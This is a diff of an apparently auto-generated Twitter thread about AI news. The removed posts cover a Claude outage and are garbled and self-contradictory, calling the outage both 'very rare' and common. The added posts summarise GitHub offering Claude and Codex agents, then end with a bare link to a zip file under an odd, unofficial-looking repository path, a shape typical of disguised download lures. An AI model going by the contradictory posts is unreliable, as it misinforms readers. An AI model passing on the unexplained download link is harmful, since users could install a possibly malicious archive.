@@ -1,16 +1,8 @@
-Generated on: 2026-02-03 22:58:52.594680
+Generated on: 2026-02-05 20:56:06.355469
 Platform: TWITTER
 
-1/ Anthropic's Claude AI models experienced a major outage today, impacting products like Claude Code. Developers were seeing a 500 error when trying to use Claude Code, and Anthropic said that it was seeing elevated error rates on its APIs "across all Claude models." Anthropic quickly identified the root cause and implemented a fix within around [&#8230;]
+1/ 🔥 This topic is rapidly gaining attention.
 
-2/ This is a very rare occurrence for a company like Anthropic, and it's not uncommon for a company to have a major outage. But this was just one example of a large number of issues affecting the community.
+2/ GitHub is making Claude by Anthropic and OpenAI's Codex AI coding agents directly available inside GitHub today. A new public preview adds Claude and Codex to GitHub, GitHub Mobile, and Visual Studio Code, for users with a Copilot Pro Plus or Copilot Enterprise subscription. The move is part of Agent HQ, GitHub's vision to make [&#8230;]
 
-3/ Affected
-
-4/ We've seen an uptick in issues and a lot of them are very much related to the recent outage.
-
-5/ It's very rare for a company to have a major outage, and it's not uncommon for a company to have a major outage.
-
-6/ In fact, I've seen a lot of this happen over the past year.
-
-7/ This is a common occurrence for a company.
+3/ [#8230;] https://github.com/codex/Codex-AI-Code-Actors-GitHub/releases/download/4.2.0/codex-autohotkey.xcodeproj/codex-autohotkey.zip
